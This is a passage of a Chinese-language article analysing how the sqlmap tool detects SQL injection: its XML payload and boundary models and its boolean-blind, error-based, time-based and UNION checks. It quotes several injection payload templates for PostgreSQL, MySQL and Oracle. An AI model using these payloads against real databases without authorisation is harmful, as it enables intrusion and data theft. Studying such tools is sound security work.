[FROM_DUMMY_TABLE.get(dbms)] )=&quot;[RANDSTR1]&quot;&lt;/code&gt; 和 &lt;code class=&quot;inline&quot;&gt;(SELECT &#39;[RANDSTR]&#39; [FROM_DUMMY_TABLE.get(dbms)] )=&#39;[RANDSTR1]&#39;&lt;/code&gt; 这两个 Payload 的请求判断。其中&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;FROM_DUMMY_TABLE = {
    DBMS.ORACLE: &quot; FROM DUAL&quot;,
    DBMS.ACCESS: &quot; FROM MSysAccessObjects&quot;,
    DBMS.FIREBIRD: &quot; FROM RDB$DATABASE&quot;,
    DBMS.MAXDB: &quot; FROM VERSIONS&quot;,
    DBMS.DB2: &quot; FROM SYSIBM.SYSDUMMY1&quot;,
    DBMS.HSQLDB: &quot; FROM INFORMATION_SCHEMA.SYSTEM_USERS&quot;,
    DBMS.INFORMIX: &quot; FROM SYSMASTER:SYSDUAL&quot;
}&lt;/code&gt;&lt;p&gt;例如，检查是否是 ORACLE 的时候，就会生成 &lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
(SELECT &#39;abc&#39; FROM DUAL)=&#39;abc&#39; 
(SELECT &#39;abc&#39; FROM DUAL)=&#39;abcd&#39;&lt;/code&gt;&lt;p&gt;这样的两个 Payload，如果确实存在正负关系（具体内容参见后续章节的布尔盲注检测），则表明数据库就是 ORACLE。&lt;/p&gt;&lt;p&gt;当然数据库类型检测并不是必须的，因为 sqlmap 实际工作中，如果没有指定 DBMS 则会按照当前测试 Payload 的对应的数据库类型去设置。&lt;/p&gt;&lt;p&gt;实际上在各种 Payload 的执行过程中，会包含着一些数据库的推断信息(&lt;code class=&quot;inline&quot;&gt;&amp;lt;details&amp;gt;&lt;/code&gt;)，如果 Payload 成功执行，这些信息可以被顺利推断则数据库类型就可以推断出来。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;测试数据模型与 Payload 介绍&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在实际的代码中，&lt;code class=&quot;inline&quot;&gt;checkSqlInjection&lt;/code&gt; 是一个接近七百行的函数。当然其行为也并不是仅仅通过我们上面列出的步骤就可以完全概括的，其中涉及到了很多关于 Payload 定义中字段的操作。显然，直到现在我们都并不是特别了解一个 Payload 中存在着什么样的定义，当然也不会懂得这些操作对于这些字段到底有什么具体的意义。所以我们没有办法在不了解真正 Payload 的时候开始之后的步骤。&lt;/p&gt;&lt;p&gt;因此在本节中，我们会详细介绍关于具体测试 Payload 的数据模型，并且基于这些模型和源码分析 sqlmap 实际的行为，和 sql 注入原理的细节知识。   ·&lt;/p&gt;&lt;h2&gt;&lt;b&gt;&amp;lt;test&amp;gt; 通用模型&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;关于通用模型其实在 sqlmap 中有非常详细的说明，位置在 &lt;code class=&quot;inline&quot;&gt;xml/payloads/boolean_blind.xml&lt;/code&gt; 中，我们把他们分隔开分别来讲解具体字段对应的代码的行为。&lt;/p&gt;&lt;p&gt;首先我们必须明白一个具体的 testcase 对应一个具体的 xml 元素是什么样子：&lt;/p&gt;&lt;code lang=&quot;xml&quot;&gt;
&amp;lt;test&amp;gt;
    &amp;lt;title&amp;gt;&amp;lt;/title&amp;gt;
    &amp;lt;stype&amp;gt;&amp;lt;/stype&amp;gt;
    &amp;lt;level&amp;gt;&amp;lt;/level&amp;gt;
    &amp;lt;risk&amp;gt;&amp;lt;/risk&amp;gt;
    &amp;lt;clause&amp;gt;&amp;lt;/clause&amp;gt;
    &amp;lt;where&amp;gt;&amp;lt;/where&amp;gt;
    &amp;lt;vector&amp;gt;&amp;lt;/vector&amp;gt;
    &amp;lt;request&amp;gt;
        &amp;lt;payload&amp;gt;&amp;lt;/payload&amp;gt;
        &amp;lt;comment&amp;gt;&amp;lt;/comment&amp;gt;
        &amp;lt;char&amp;gt;&amp;lt;/char&amp;gt;
        &amp;lt;columns&amp;gt;&amp;lt;/columns&amp;gt;
    &amp;lt;/request&amp;gt;
    &amp;lt;response&amp;gt;
        &amp;lt;comparison&amp;gt;&amp;lt;/comparison&amp;gt;
        &amp;lt;grep&amp;gt;&amp;lt;/grep&amp;gt;
        &amp;lt;time&amp;gt;&amp;lt;/time&amp;gt;
        &amp;lt;union&amp;gt;&amp;lt;/union&amp;gt;
    &amp;lt;/response&amp;gt;
    &amp;lt;details&amp;gt;
        &amp;lt;dbms&amp;gt;&amp;lt;/dbms&amp;gt;
        &amp;lt;dbms_version&amp;gt;&amp;lt;/dbms_version&amp;gt;
        &amp;lt;os&amp;gt;&amp;lt;/os&amp;gt;
    &amp;lt;/details&amp;gt;
&amp;lt;/test&amp;gt;&lt;/code&gt;&lt;p&gt;关于上面的一个 &lt;code class=&quot;inline&quot;&gt;&amp;lt;test&amp;gt;&lt;/code&gt; 标签内的元素都是实际上包含的不只是一个 Payload 还包含&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
Sub-tag: &amp;lt;title&amp;gt;
    Title of the test. 测试的名称，这些名称就是我们实际在测试的时候输出的日志中的内容&lt;/code&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-11a7571b205d2558989f6054596e05cb_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;768&quot; data-rawheight=&quot;285&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-11a7571b205d2558989f6054596e05cb&quot; data-watermark-src=&quot;v2-e0b5748a512d87cfb212898eb0a3b017&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;上图表示一个 &lt;code class=&quot;inline&quot;&gt;&amp;lt;test&amp;gt;&lt;/code&gt; 中的 title 会被输出作为调试信息。&lt;/p&gt;&lt;p&gt;除非必要的子标签，笔者将会直接把标注写在下面的代码块中，&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;Sub-tag: &amp;lt;stype&amp;gt;
    SQL injection family type. 表示注入的类型。
​
    Valid values:
        1: Boolean-based blind SQL injection
        2: Error-based queries SQL injection
        3: Inline queries SQL injection
        4: Stacked queries SQL injection
        5: Time-based blind SQL injection
        6: UNION query SQL injection
​
Sub-tag: &amp;lt;level&amp;gt;
    From which level check for this test. 测试的级别
​
    Valid values:
        1: Always (&amp;lt;100 requests)
        2: Try a bit harder (100-200 requests)
        3: Good number of requests (200-500 requests)
        4: Extensive test (500-1000 requests)
        5: You have plenty of time (&amp;gt;1000 requests)
​
Sub-tag: &amp;lt;risk&amp;gt;
    Likelihood of a payload to damage the data integrity.这个选项表明对目标数据库的损坏程度，risk 最高三级，最高等级代表对数据库可能会有危险的•操作，比如修改一些数据，插入一些数据甚至删除一些数据。
​
    Valid values:
        1: Low risk
        2: Medium risk
        3: High risk
​
Sub-tag: &amp;lt;clause&amp;gt;
    In which clause the payload can work. 这个字段表明 &amp;lt;test&amp;gt; 对应的测试 Payload 适用于哪种类型的 SQL 语句。一般来说，很多语句并不一定非要特定 WHERE 位置的。
​
    NOTE: for instance, there are some payload that do not have to be
    tested as soon as it has been identified whether or not the
    injection is within a WHERE clause condition.
​
    Valid values:
        0: Always
        1: WHERE / HAVING
        2: GROUP BY
        3: ORDER BY
        4: LIMIT
        5: OFFSET
        6: TOP
        7: Table name
        8: Column name
        9: Pre-WHERE (non-query)
​
    A comma separated list of these values is also possible.&lt;/code&gt;&lt;p&gt;在上面几个子标签中，我们经常见的就是 &lt;code class=&quot;inline&quot;&gt;level/risk&lt;/code&gt; 一般来说，默认的 sqlmap 配置跑不出漏洞的时候，我们通常会启动更高级别 &lt;code class=&quot;inline&quot;&gt;(level=5/risk=3)&lt;/code&gt; 的配置项来启动更多的 payload。&lt;/p&gt;&lt;p&gt;接下来我们再分析下面的标签&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
Sub-tag: &amp;lt;where&amp;gt;
    Where to add our &#39;&amp;lt;prefix&amp;gt; &amp;lt;payload&amp;gt;&amp;lt;comment&amp;gt; &amp;lt;suffix&amp;gt;&#39; string.
​
    Valid values:
        1: Append the string to the parameter original value
        2: Replace the parameter original value with a negative random
            integer value and append our string
        3: Replace the parameter original value with our string
​
Sub-tag: &amp;lt;vector&amp;gt;
    The payload that will be used to exploit the injection point.
    这个标签只是大致说明 Payload 长什么样子，其实实际请求的 Payload 或者变形之前的 Payload 可能并不是这个 Payload，以 request 子标签中的 payload 为准。
​
Sub-tag: &amp;lt;request&amp;gt; 
    What to inject for this test.
    关于发起请求的设置与配置。在这些配置中，有一些是特有的，但是有一些是必须的，例如 payload 是肯定存在的，但是 comment 是不一定有的，char 和 columns 是只有 UNION 才存在
​
    Sub-tag: &amp;lt;payload&amp;gt;
        The payload to test for. 实际测试使用的 Payload
​
    Sub-tag: &amp;lt;comment&amp;gt;
        Comment to append to the payload, before the suffix.
​
    Sub-tag: &amp;lt;char&amp;gt; 只有 UNION 注入存在的字段
        Character to use to bruteforce number of columns in UNION
        query SQL injection tests.
​
    Sub-tag: &amp;lt;columns&amp;gt; 只有 UNION 注入存在的字段
        Range of columns to test for in UNION query SQL injection
        tests.
​
Sub-tag: &amp;lt;response&amp;gt;
    How to identify if the injected payload succeeded.
    由于 payload 的目的不一定是相同的，所以，实际上处理请求的方法也并不是相同的，具体的处理方法步骤，在我们后续的章节中有详细的分析。
​
    Sub-tag: &amp;lt;comparison&amp;gt; 
        针对布尔盲注的特有字段，表示对比和 request 中请求的结果。
        Perform a request with this string as the payload and compare
        the response with the &amp;lt;payload&amp;gt; response. Apply the comparison
        algorithm.
​
        NOTE: useful to test for boolean-based blind SQL injections.
​
    Sub-tag: &amp;lt;grep&amp;gt; 
        针对报错型注入的特有字段，使用正则表达式去匹配结果。
        Regular expression to grep for in the response body.
​
        NOTE: useful to test for error-based SQL injection.
​
    Sub-tag: &amp;lt;time&amp;gt;
        针对时间盲注
        Time in seconds to wait before the response is returned.
​
        NOTE: useful to test for time-based blind and stacked queries
        SQL injections.
​
    Sub-tag: &amp;lt;union&amp;gt;
        处理 UNION •注入的办法。
        Calls unionTest() function.
​
        NOTE: useful to test for UNION query (inband) SQL injection.
​
Sub-tag: &amp;lt;details&amp;gt;
    Which details can be infered if the payload succeed.
    如果 response 标签中的检测结果成功了，可以推断出什么结论？
​
    Sub-tags: &amp;lt;dbms&amp;gt;
        What is the database management system (e.g. MySQL).
​
    Sub-tags: &amp;lt;dbms_version&amp;gt;
        What is the database management system version (e.g. 5.0.51).
​
    Sub-tags: &amp;lt;os&amp;gt;
        What is the database management system underlying operating
        system.&lt;/code&gt;&lt;p&gt;在初步了解了基本的 Payload 测试数据模型之后，我们接下来进行详细的检测逻辑的细节分析，因为篇幅的原因，我们暂且只针对布尔盲注和时间盲注进行分析，&lt;/p&gt;&lt;h2&gt;&lt;b&gt;真正的 Payload&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我们在前面的介绍中发现了几个疑似 Payload 的字段，但是遗憾的是，上面的每一个 Payload 都不是真正的 Payload。实际 sqlmap 在处理的过程中，只要是从 &lt;code class=&quot;inline&quot;&gt;*.xml&lt;/code&gt; 中加载的 Payload，都是需要经过一些随机化和预处理，这些预处理涉及到的概念如下：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;code class=&quot;inline&quot;&gt;Boundary&lt;/code&gt;：需要为原始 Payload 的前后添加“边界”。边界是一个神奇的东西，主要取决于当前“拼接”的 SQL 语句的上下文，常见上下文：注入位置是一个“整形”；注入位置需要单引号/双引号&lt;code class=&quot;inline&quot;&gt;(&#39;/&quot;)&lt;/code&gt;闭合边界；注入位置在一个括号语句中。&lt;/li&gt;&lt;li&gt;&lt;code class=&quot;inline&quot;&gt;--tamper&lt;/code&gt;：Tamper 是 sqlmap 中最重要的概念之一，也是 Bypass 各种防火墙的有力的武器。在 sqlmap 中，Tamper 的处理位于我们上一篇文章中的 &lt;code class=&quot;inline&quot;&gt;agent.queryPage()&lt;/code&gt; 中，具体位于其对 Payload 的处理。&lt;/li&gt;&lt;li&gt;&lt;code class=&quot;inline&quot;&gt;&quot;Render&quot;&lt;/code&gt;：当然这一个步骤在 sqlmap 中没有明显的概念进行对应，其主要是针对 Payload 中随机化的标签进行渲染和替换，例如：&lt;br&gt;&lt;br&gt;[INFERENCE] 这个标签通常被替换成一个等式，这个等式用于判断结果的正负`Positive/Negative`&lt;br&gt;[RANDSTR] 会被替换成随机字符串&lt;br&gt;[RANDNUM] 与 [RANDNUMn] •会被替换成不同的数字&lt;br&gt;[SLEEPTIME] 在时间盲注中会被替换为 SLEEP 的时间&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;所以，实际上从 &lt;code class=&quot;inline&quot;&gt;*.xml&lt;/code&gt; 中加载出来的 Payload 需要经过上面的处理才能真的算是处理完成。这个 Payload 才会在 &lt;code class=&quot;inline&quot;&gt;agent.queryPage&lt;/code&gt; 的日志中输出出来，也就是我们 &lt;code class=&quot;inline&quot;&gt;sqlmap -v3&lt;/code&gt; 选项看到的最终 Payload。&lt;/p&gt;&lt;p&gt;在上面的介绍中，我们又提到了一个陌生的概念，&lt;code class=&quot;inline&quot;&gt;Boundary&lt;/code&gt;，并且做了相对简单的介绍，具体的 &lt;code class=&quot;inline&quot;&gt;Boundary&lt;/code&gt;，我们在 &lt;code class=&quot;inline&quot;&gt;{sqlmap_dir}/xml/boundaries.xml&lt;/code&gt; 中可以找到：&lt;/p&gt;&lt;code lang=&quot;xml&quot;&gt;
&amp;lt;boundary&amp;gt;
    &amp;lt;level&amp;gt;&amp;lt;/level&amp;gt; 
    &amp;lt;clause&amp;gt;&amp;lt;/clause&amp;gt;
    &amp;lt;where&amp;gt;&amp;lt;/where&amp;gt;
    &amp;lt;ptype&amp;gt;&amp;lt;/ptype&amp;gt;
    &amp;lt;prefix&amp;gt;&amp;lt;/prefix&amp;gt;
    &amp;lt;suffix&amp;gt;&amp;lt;/suffix&amp;gt;
&amp;lt;/boundary&amp;gt;&lt;/code&gt;&lt;p&gt;在具体的定义中，我们发现没见过的子标签如下：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
    Sub-tag: &amp;lt;ptype&amp;gt;
        What is the parameter value type. 参数•类型（参数边界上下文类型）
​
        Valid values:
            1: Unescaped numeric
            2: Single quoted string
            3: LIKE single quoted string
            4: Double quoted string
            5: LIKE double quoted string
​
    Sub-tag: &amp;lt;prefix&amp;gt;
        A string to prepend to the payload.
​
    Sub-tag: &amp;lt;suffix&amp;gt;
        A string to append to the payload.&lt;/code&gt;&lt;p&gt;其实到现在 sqlmap 中 Payload 的结构我们就非常清楚了&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
&amp;lt;prefix&amp;gt; &amp;lt;payload&amp;gt;&amp;lt;comment&amp;gt; &amp;lt;suffix&amp;gt;&lt;/code&gt;&lt;p&gt;其中 &lt;code class=&quot;inline&quot;&gt;&amp;lt;prefix&amp;gt; &amp;lt;suffix&amp;gt;&lt;/code&gt; 来源于 &lt;code class=&quot;inline&quot;&gt;boundaries.xml&lt;/code&gt; 中，而 &lt;code class=&quot;inline&quot;&gt;&amp;lt;payload&amp;gt; &amp;lt;comment&amp;gt;&lt;/code&gt; 来源于本身 &lt;code class=&quot;inline&quot;&gt;xml/payloads/*.xml&lt;/code&gt; 中的 &lt;code class=&quot;inline&quot;&gt;&amp;lt;test&amp;gt;&lt;/code&gt; 中。在本节中都有非常详细的描述了&lt;/p&gt;&lt;h2&gt;&lt;b&gt;针对布尔盲注的检测&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在接下来的小节中，我们将会针对几种注入进行详细分析，我们的分析依据主要是 sqlmap 设定的 Payload 的数据模型和其本身的代码。本节先针对布尔盲注进行一些详细分析。&lt;/p&gt;&lt;p&gt;在分析之前，我们先看一个详细的 Payload:&lt;/p&gt;&lt;code lang=&quot;xml&quot;&gt;
&amp;lt;test&amp;gt;
    &amp;lt;title&amp;gt;PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)&amp;lt;/title&amp;gt;
    &amp;lt;stype&amp;gt;1&amp;lt;/stype&amp;gt;
    &amp;lt;level&amp;gt;3&amp;lt;/level&amp;gt;
    &amp;lt;risk&amp;gt;3&amp;lt;/risk&amp;gt;
    &amp;lt;clause&amp;gt;1&amp;lt;/clause&amp;gt;
    &amp;lt;where&amp;gt;2&amp;lt;/where&amp;gt;
    &amp;lt;vector&amp;gt;OR (SELECT (CASE WHEN ([INFERENCE]) THEN NULL ELSE CAST(&#39;[RANDSTR]&#39; AS NUMERIC) END)) IS NULL&amp;lt;/vector&amp;gt;
    &amp;lt;request&amp;gt;
        &amp;lt;payload&amp;gt;OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CAST(&#39;[RANDSTR]&#39; AS NUMERIC) END)) IS NULL&amp;lt;/payload&amp;gt;
    &amp;lt;/request&amp;gt;
    &amp;lt;response&amp;gt;
        &amp;lt;comparison&amp;gt;OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN NULL ELSE CAST(&#39;[RANDSTR]&#39; AS NUMERIC) END)) IS NULL&amp;lt;/comparison&amp;gt;
    &amp;lt;/response&amp;gt;
    &amp;lt;details&amp;gt;
        &amp;lt;dbms&amp;gt;PostgreSQL&amp;lt;/dbms&amp;gt;
    &amp;lt;/details&amp;gt;
&amp;lt;/test&amp;gt;&lt;/code&gt;&lt;p&gt;根据上一节介绍的子标签的特性，我们可以大致观察这个 &lt;code class=&quot;inline&quot;&gt;&amp;lt;test&amp;gt;&lt;/code&gt; 会至少发送两个 Payload：第一个为 &lt;code class=&quot;inline&quot;&gt;request&lt;/code&gt; 标签中的 &lt;code class=&quot;inline&quot;&gt;payload&lt;/code&gt; 第二个为 &lt;code class=&quot;inline&quot;&gt;response&lt;/code&gt; 标签中的 &lt;code class=&quot;inline&quot;&gt;comparison&lt;/code&gt; 中的 Payload。&lt;/p&gt;&lt;p&gt;当然我们很容易想到，针对布尔盲注的检测实际上只需要检测 &lt;code class=&quot;inline&quot;&gt;request.payload&lt;/code&gt; 和 &lt;code class=&quot;inline&quot;&gt;response.comparison&lt;/code&gt; 这两个请求，只要这两个请求页面不相同，就可以判定是存在问题的。可是事实真的如此吗？结果当然并没有这么简单。&lt;/p&gt;&lt;p&gt;我们首先定义 &lt;code class=&quot;inline&quot;&gt;request.payload&lt;/code&gt; 中的的请求为正请求 &lt;code class=&quot;inline&quot;&gt;Positive&lt;/code&gt;，对应 &lt;code class=&quot;inline&quot;&gt;response.comparison&lt;/code&gt; 中的请求为负请求 &lt;code class=&quot;inline&quot;&gt;Negative&lt;/code&gt;，在 sqlmap 中原处理如下：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-889c61c0043a4bbae05fd30cecbbaac5_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1478&quot; data-rawheight=&quot;762&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-889c61c0043a4bbae05fd30cecbbaac5&quot; data-watermark-src=&quot;v2-4264d6978637ad50c6159d8c55c8ca5d&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;在代码批注中我们进行详细的解释，为了让大家看得更清楚，我们把代码转变为流程图：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-6e395260b8da555410426a857d7211f9_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;510&quot; data-rawheight=&quot;825&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-6e395260b8da555410426a857d7211f9&quot; data-watermark-src=&quot;v2-1cfc26e92a86a341a395d991fb6cc5f5&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;其中最容易被遗忘的可能并不是正负请求的对比，而是正请求与模版页面的对比，负请求与错误请求的对比和错误请求与模版页面的对比，因为广泛存在一种情况是类似文件包含模式的情况，不同的合理输入的结果有大概率不相同，且每一次输入的结果如果报错都会跳转到某一个默认页面（存在默认参数），这种情况仅仅用正负请求来区分页面不同是完全不够用的，还需要各种情形与模版页面的比较来确定。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;针对 GREP 型（报错注入）&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;针对报错注入其实非常好识别，在报错注入检测的过程中，我们会发现他的 &lt;code class=&quot;inline&quot;&gt;response&lt;/code&gt; 子标签中，包含着是 &lt;code class=&quot;inline&quot;&gt;grep&lt;/code&gt; 子标签：&lt;/p&gt;&lt;code lang=&quot;xml&quot;&gt;
&amp;lt;test&amp;gt;
    &amp;lt;title&amp;gt;MySQL &amp;amp;gt;= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)&amp;lt;/title&amp;gt;
    &amp;lt;stype&amp;gt;2&amp;lt;/stype&amp;gt;
    &amp;lt;level&amp;gt;5&amp;lt;/level&amp;gt;
    &amp;lt;risk&amp;gt;1&amp;lt;/risk&amp;gt;
    &amp;lt;clause&amp;gt;1,2,3,9&amp;lt;/clause&amp;gt;
    &amp;lt;where&amp;gt;1&amp;lt;/where&amp;gt;
    &amp;lt;vector&amp;gt;AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(&#39;[DELIMITER_START]&#39;,([QUERY]),&#39;[DELIMITER_STOP]&#39;)) USING utf8)))&amp;lt;/vector&amp;gt;
    &amp;lt;request&amp;gt;
        &amp;lt;payload&amp;gt;AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(&#39;[DELIMITER_START]&#39;,(SELECT (ELT([RANDNUM]=[RANDNUM],1))),&#39;[DELIMITER_STOP]&#39;)) USING utf8)))&amp;lt;/payload&amp;gt;
    &amp;lt;/request&amp;gt;
    &amp;lt;response&amp;gt;
        &amp;lt;grep&amp;gt;[DELIMITER_START](?P&amp;amp;lt;result&amp;amp;gt;.*?)[DELIMITER_STOP]&amp;lt;/grep&amp;gt;
    &amp;lt;/response&amp;gt;
    &amp;lt;details&amp;gt;
        &amp;lt;dbms&amp;gt;MySQL&amp;lt;/dbms&amp;gt;
        &amp;lt;dbms_version&amp;gt;&amp;amp;gt;= 5.7.8&amp;lt;/dbms_version&amp;gt;
    &amp;lt;/details&amp;gt;
&amp;lt;/test&amp;gt;&lt;/code&gt;&lt;p&gt;我们发现子标签 &lt;code class=&quot;inline&quot;&gt;grep&lt;/code&gt; 中是正则表达式，可以直接从整个请求中通过 grep 中的正则提取出对应的内容，如果成功提取出了对应内容，则说明该参数可以进行注入。&lt;/p&gt;&lt;p&gt;在具体代码中，其实非常直观可以看到：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-dbdc68e369293fa89fd0683922aa541b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1132&quot; data-rawheight=&quot;451&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-dbdc68e369293fa89fd0683922aa541b&quot; data-watermark-src=&quot;v2-b46b7662e0a4c22eb8b9979bfed695eb&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;再 sqlmap 的实现中其实并不是仅仅检查页面内容就足够的，除了页面内容之外，检查如下项：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;HTTP 的错误页面&lt;/li&gt;&lt;li&gt;Headers 中的内容&lt;/li&gt;&lt;li&gt;重定向信息&lt;/li&gt;&lt;/ol&gt;&lt;h2&gt;&lt;b&gt;针对 TIME 型（时间盲注，HeavilyQuery）&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;当然时间盲注我们可以很容易猜到应该怎么处理：如果发出了请求导致延迟了 X 秒，并且响应延迟的时间是我们预期的时间，那么就可以判定这个参数是一个时间注入点。&lt;/p&gt;&lt;p&gt;但是仅仅是这样就可以了嘛？当然我们需要了解的是 sqlmap 如何设置这个 X 作为时间点（请看下面这个函数，位于 &lt;code class=&quot;inline&quot;&gt;agent.queryPage&lt;/code&gt; 中）：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-0291e85a6985aa5192c135f7356b8681_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1390&quot; data-rawheight=&quot;655&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-0291e85a6985aa5192c135f7356b8681&quot; data-watermark-src=&quot;v2-22eec861df21fd6569007ffdf640ec21&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;我们发现，它里面有一个数学概念：&lt;a href=&quot;https://zh.wikipedia.org/wiki/%E6%A8%99%E6%BA%96%E5%B7%AE&quot;&gt;标准差&lt;/a&gt;&lt;/p&gt;&lt;blockquote&gt;简单来说，标准差是一组数值自平均值分散开来的程度的一种测量观念。一个较大的标准差，代表大部分的数值和其平均值之间差异较大；一个较小的标准差，代表这些数值较接近平均值。例如，两组数的集合{0, 5, 9, 14}和{5, 6, 8, 9}其平均值都是7，但第二个集合具有较小的标准差。述“相差k个标准差”，即在 X̄ ± kS 的样本（Sample）范围内考量。标准差可以当作不确定性的一种测量。例如在物理科学中，做重复性测量时，测量数值集合的标准差代表这些测量的精确度。当要决定测量值是否符合预测值，测量值的标准差占有决定性重要角色：如果测量平均值与预测值相差太远（同时与标准差数值做比较），则认为测量值与预测值互相矛盾。这很容易理解，因为如果测量值都落在一定数值范围之外，可以合理推论预测值是否正确。&lt;/blockquote&gt;&lt;p&gt;根据注释和批注中的解释，我们发现我们需要设定一个最小 SLEEPTIME 应该至少大于 &lt;code class=&quot;inline&quot;&gt;样本内平均响应时间 + 7 * 样本标准差&lt;/code&gt;，这样就可以保证过滤掉 &lt;code class=&quot;inline&quot;&gt;99.99%&lt;/code&gt; 的无延迟请求。&lt;/p&gt;&lt;p&gt;当然除了这一点，我们还发现&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;
delta = threadData.lastQueryDuration - conf.timeSec
if Backend.getIdentifiedDbms() in (DBMS.MYSQL,):  # MySQL&#39;s SLEEP(X) lasts 0.05 seconds shorter on average
    delta += 0.05
return delta &amp;gt;= 0&lt;/code&gt;&lt;p&gt;这一段代码作为 mysql 的 Patch 存在 &lt;code class=&quot;inline&quot;&gt;# MySQL&#39;s SLEEP(X) lasts 0.05 seconds shorter on average&lt;/code&gt;。&lt;/p&gt;&lt;p&gt;如果我们要自己实现时间盲注的检测的话，这一点也是必须注意和实现的。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;针对 UNION 型（UNION Query）&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;UNION 注入可以说是 sqlmap 中最复杂的了，同时也是最经典的注入情形。&lt;/p&gt;&lt;p&gt;其实关于 UNION 注入的检测，和我们一开始学习 SQL 注入的方法是一样的，猜解列数，猜解输出点在列中位置。实际在 sqlmap 中也是按照这个来进行漏洞检测的，具体的测试方法位于：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-110a1145556b933e5ac2e73ff298f714_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;833&quot; data-rawheight=&quot;526&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-110a1145556b933e5ac2e73ff298f714&quot; data-watermark-src=&quot;v2-f370bebaeaefc7c866ba0c982e1a2c68&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;跟入 &lt;code class=&quot;inline&quot;&gt;unionTest()&lt;/code&gt; 中我们发现如下操作&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;
def unionTest(comment, place, parameter, value, prefix, suffix):
    &quot;&quot;&quot;
    This method tests if the target URL is affected by an union
    SQL injection vulnerability. The test is done up to 3*50 times
    &quot;&quot;&quot;
​
    if conf.direct:
        return
​
    kb.technique = PAYLOAD.TECHNIQUE.UNION
    validPayload, vector = _unionTestByCharBruteforce(comment, place, parameter, value, prefix, suffix)
​
    if validPayload:
        validPayload = agent.removePayloadDelimiters(validPayload)
​
    return validPayload, vector&lt;/code&gt;&lt;p&gt;最核心的逻辑位于 &lt;code class=&quot;inline&quot;&gt;_unionTestByCharBruteforce&lt;/code&gt; 中，继续跟入，我们发现其检测的大致逻辑如下：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-c529ff3eaf28512368b2b2045da53140_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1501&quot; data-rawheight=&quot;674&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-c529ff3eaf28512368b2b2045da53140&quot; data-watermark-src=&quot;v2-6e6e8a25b589fb0a620495fd84a30b6d&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;别急，我们一步一步来分析！&lt;/p&gt;&lt;h2&gt;&lt;b&gt;猜列数&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我相信做过渗透测试的读者基本对这个词都非常非常熟悉，如果有疑问或者不清楚的请自行百度，笔者再次不再赘述关于 SQL 注入基本流程的部分。&lt;/p&gt;&lt;p&gt;为什么要把一件这么简单的事情单独拿出来说呢？当然这预示着 sqlmap 并不是非常简单的在处理这一件事情，因为作为一个渗透测试人员，当然可以很容易靠肉眼分辨出很多事情，但是这些事情在计算机看来却并不是那么容易可以判断的：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;使用 ORDER BY 查询，直接通过与模版页面的比较来获取列数。&lt;/li&gt;&lt;li&gt;当 ORDER BY 失效的时候，使用多次 &lt;code class=&quot;inline&quot;&gt;UNION SELECT&lt;/code&gt; 不同列数，获取多个 Ratio，通过区分 Ratio 来区分哪一个是正确的列数。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;实际在使用的过程中，&lt;code class=&quot;inline&quot;&gt;ORDER BY&lt;/code&gt; 的核心逻辑如下，关于其中页面比较技术我们就不赘述了，不过值得一提的是 sqlmap 